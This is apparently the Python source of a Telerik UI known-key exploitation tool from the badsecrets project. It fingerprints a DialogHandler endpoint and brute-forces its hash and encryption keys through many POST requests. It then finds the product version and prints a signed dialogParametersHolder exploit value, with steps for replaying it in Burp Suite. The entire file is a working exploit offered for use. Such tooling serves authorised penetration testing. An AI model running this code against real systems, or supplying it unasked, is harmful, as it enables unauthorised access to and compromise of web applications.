#!/usr/bin/env python3
# badsecrets - Telerik UI known key exploitation tool
# Black Lantern Security - https://www.blacklanternsecurity.com
# @paulmmueller

import os
import re
import sys
import base64
import urllib.parse
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from badsecrets import modules_loaded

Telerik_HashKey = modules_loaded["telerik_hashkey"]
Telerik_EncryptionKey = modules_loaded["telerik_encryptionkey"]

telerik_versions = [
    "2022.3.1109",
    "2022.3.913",
    "2022.2.622",
    "2022.2.511",
    "2022.1.302",
    "2022.1.119",
    "2021.3.1111",
    "2021.3.914",
    "2021.2.616",
    "2021.2.511",
    "2021.1.330",
    "2021.1.224",
    "2021.1.119",
    "2020.3.1021",
    "2020.3.915",
    "2020.2.617",
    "2020.2.512",
    "2020.1.219",
    "2020.1.114",
    "2019.3.1023",
    "2019.3.917",
    "2019.2.514",
    "2019.1.215",
    "2019.1.115",
    "2018.3.910",
    "2018.2.710",
    "2018.2.516",
    "2018.1.117",
]


def probe_version(
    url, hash_key, encryption_key, version, key_derive_mode, telerik_hashkey, telerik_encryptionkey, proxies
):
    b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
    b64section = base64.b64encode(b64section_plain.encode()).decode()
    plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
    derivedKey, derivedIV = telerik_encryptionkey.telerik_derivekeys(encryption_key, key_derive_mode)
    ct = telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
    dialog_parameters = telerik_hashkey.sign_enc_dialog_params(hash_key, ct)
    dialog_parameters_data = {"dialogParametersHolder": dialog_parameters}
    r = requests.post(url, data=dialog_parameters_data, verify=False, proxies=proxies)
    if r.status_code == 200:
        return dialog_parameters


def validate_url(
    arg_value,
    pattern=re.compile(
        r"^https?://((?:[A-Z0-9_]|[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_])[\.]?)+(?:[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_]|[A-Z0-9_])(?::[0-9]{1,5})?.*$",
        re.IGNORECASE,
    ),
):
    if not pattern.match(arg_value):
        raise argparse.ArgumentTypeError("URL is not formatted correctly")
    return arg_value


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        type=validate_url,
        help="The URL of the page to access and attempt to pull viewstate and generator from",
        required=True,
    )

    parser.add_argument(
        "-p",
        "--proxy",
        help="Optionally specify an HTTP proxy",
    )

    parser.add_argument(
        "-a",
        "--user-agent",
        help="Optionally set a custom user-agent",
    )

    parser.add_argument(
        "-m", "--machine-keys", help="Optionally include ASP.NET MachineKeys when loading keys", action="store_true"
    )

    args = parser.parse_args()

    if not args.url:
        return

    include_machinekeys_bool = False
    if args.machine_keys:
        include_machinekeys_bool = True
        print("MachineKeys inclusion enabled. Bruteforcing will take SIGNIFICANTLY longer")

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    headers = {}
    if args.user_agent:
        headers["User-agent"] = args.user_agent

    try:
        res = requests.get(args.url, proxies=proxies, headers=headers, verify=False)
    except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
        print(f"Error connecting to URL: [{args.url}]")
        return
    resp_body = urllib.parse.unquote(res.text)
    if "Loading the dialog..." not in resp_body:
        print(f"URL does not appear to be a Telerik UI DialogHandler")
        return

    key_derive_mode = "PBKDF1_MS"
    KDF_probe_data = {"dialogParametersHolder": "AAAA"}
    res = requests.post(args.url, data=KDF_probe_data, proxies=proxies, headers=headers, verify=False)
    resp_body = res.text

    if "Exception of type 'System.Exception' was thrown" in resp_body:
        key_derive_mode = "PBKDF2"
        print(
            "Target is a newer version of Telerik UI without verbose error messages. Hash key and Encryption key will have to BOTH match. PBKDF2 key derivation is used."
        )
    elif "Length cannot be less than zero" in resp_body:
        key_derive_mode = "PBKDF1_MS"
        print(
            "Target is post-CVE-2017-9248 patched but old enough to use older PBKDF1_MS key dervivation. Hash key can be solved independently."
        )
    else:
        print("Unexpected response encountered, aborting.")
        return

    print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")

    found_hash_key = False
    found_encryption_key = False
    x = Telerik_HashKey()
    y = Telerik_EncryptionKey()

    # PBKDF1_MS MODE
    if key_derive_mode == "PBKDF1_MS":
        hashkey_counter = 0
        for hash_key_probe, hash_key in x.hashkey_probe_generator(include_machinekeys=include_machinekeys_bool):
            hashkey_counter += 1
            data = {"dialogParametersHolder": hash_key_probe}
            res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
            resp_body = urllib.parse.unquote(res.text)

            if hashkey_counter % 1000 == 0:
                print(f"Tested {str(hashkey_counter)} hash keys so far...")

            if "The input data is not a complete block" in resp_body:
                print(f"Found matching hashkey! [{hash_key}]")
                found_hash_key = True
                break
            elif "The hash is not valid!" in resp_body:
                continue

            elif "The input is not a valid Base-64 string" in resp_body:
                print("The target appears to be a pre-2017 version, and does not have a hash key.")
                print("This means it should be vulnerable to CVE-2017-9248!!!")
                return

        if found_hash_key:
            print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")

            encryptionkey_counter = 0
            for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
                hash_key, key_derive_mode, include_machinekeys=include_machinekeys_bool
            ):
                encryptionkey_counter += 1
                data = {"dialogParametersHolder": encryption_key_probe}
                res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)

                if encryptionkey_counter % 1000 == 0:
                    print(f"Tested {str(encryptionkey_counter)} encryption keys so far...")
                if "Index was outside the bounds of the array" in res.text:
                    print(f"Found Encryption key! [{encryption_key}]")
                    found_encryption_key = True
                    break

            if found_encryption_key == False:
                print("Could not identify encryption key.")
                return
        else:
            print("Count not identify hash key.")
            return

    elif key_derive_mode == "PBKDF2":
        if include_machinekeys_bool:
            print(
                "Warning: MachineKeys inclusion mode is enabled, which affects this Telerik version particularly dramatically. Brute Forcing will be VERY SLOW"
            )
            print("Try without the MachineKeys first!")
        print("About to bruteforce hash key and encryption key combinations...")
        count = 0
        for hash_key in x.prepare_keylist(include_machinekeys=include_machinekeys_bool):
            for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
                hash_key, key_derive_mode, include_machinekeys=include_machinekeys_bool
            ):
                count += 1
                data = {"dialogParametersHolder": encryption_key_probe}
                res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
                if "Index was outside the bounds of the array" in res.text:
                    print(f"Found Encryption key! [{encryption_key}]")
                    print(f"Found matching hashkey! [{hash_key}]")
                    found_hash_key = True
                    found_encryption_key = True
                    break
                if count % 1000 == 0:
                    print(f"Tested {str(count)} hash key / encryption key combinations so far...")

            if found_hash_key:
                break

    if found_hash_key and found_encryption_key:
        print(
            "Both encryption key and hash key were found: attempting to brute-force Telerik UI version and generate exploitation payload"
        )

        versions = []
        for v in telerik_versions:
            versions.append(v)
        undotted_versions = []
        for v in telerik_versions:
            undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
        versions += undotted_versions

        for version in versions:
            dialog_parameters = probe_version(
                args.url, hash_key, encryption_key, version, key_derive_mode, x, y, proxies
            )
            if dialog_parameters:
                print(f"Found Telerik Version! [{version}]")
                print("Submit a POST request, with dialogParametersHolder POST parameter set to this value")
                print("Then use Burp Suite to replay the request in the browser")
                print("Dialog Parameters Exploit Value:")
                print(urllib.parse.quote_plus(dialog_parameters))
                return

    else:
        print("Did not find hashkey / encryption key. Exiting.")


if __name__ == "__main__":
    print("badsecrets - Telerik UI known key exploitation tool\n")
    main()
